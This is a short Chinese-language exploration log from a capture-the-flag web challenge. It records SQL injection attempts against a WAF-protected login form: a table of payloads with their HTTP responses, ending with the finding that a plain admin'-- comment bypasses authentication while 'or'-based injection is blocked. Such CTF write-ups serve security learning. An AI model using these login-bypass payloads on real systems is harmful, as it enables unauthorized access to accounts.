# e1-05 · 探索记录

对应题解：[`e1-05.md`](./e1-05.md)

## 目标与起点

页面强调 Unicode 和 `accept-charset="UTF-8"`，同时脚注写着 WAF。先用和前面几题相同的 ASCII 注释试一次，确认多语言是不是必经步骤。

## 第一阶段：ASCII 注释已经足够

`admin'--` 和 `admin'-- -` 都是 302。布尔注入仍是 403。全角引号和反斜杠转义都没有制造出新的通路。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `admin' or '1'='1` | 边界拦截 | 403 |
| `admin'#` | 认证失败 | 200，Invalid username or password |
| `admin\'-- -` | 认证失败 | 200。引号被转义，用户名没有断开 SQL 字符串 |
| 用户名里的制表符 `admin'%09-- -` | 认证失败 | 200，没有 Location |
| 全角引号 `admin＇-- -` | 没有登录成功 | 响应不是 302 |
| `admin'--` | 进入仪表盘 | 302 `dashboard.php`，页面含 flag |

## 这次真正的收获

这台的 WAF 同样拦 `or`，不拦 SQL 注释。页面上的 Unicode 说明没有成为读到 flag 的条件，普通的半角引号加 `--` 就能把口令比较切掉。
